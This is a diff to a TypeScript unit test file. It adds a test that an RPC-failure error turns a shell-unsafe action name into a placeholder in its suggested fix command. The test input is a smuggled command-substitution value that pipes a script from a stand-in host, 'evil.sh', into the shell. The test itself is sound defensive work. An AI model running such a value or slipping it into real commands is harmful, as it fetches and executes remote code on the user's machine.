@@ -11,6 +11,7 @@ import {
   ActionUnregisteredError,
   IdempotencyConflictError,
   InputInvalidError,
+  RpcFailedError,
 } from './errors';
 
 const CAN_ARGUMENT = /can\('(?<permission>[^']*)'\)/;
@@ -51,5 +52,20 @@ describe('unit · docs', () => {
       expect(error.docs, error.code).not.toContain(error.code);
       expect(describeErrorCode(error.code).docs, error.code).toBe(ERROR_DOCS_URL);
     }
+  });
+});
+
+describe('unit · X_RPC_FAILED pastes a command a hostile name cannot run through', () => {
+  test('an ordinary action name travels verbatim', () => {
+    expect(new RpcFailedError('publishPost', 502).fix).toContain(
+      'x actions describe publishPost --json',
+    );
+  });
+
+  test('a name that is not shell-safe becomes the placeholder, and stays in the cause', () => {
+    const error = new RpcFailedError('x$(curl -s http://evil.sh|sh)', 502);
+    expect(error.fix).not.toContain('$(');
+    expect(error.fix).toContain('x actions describe <action-name> --json');
+    expect(error.cause).toContain('evil.sh');
   });
 });
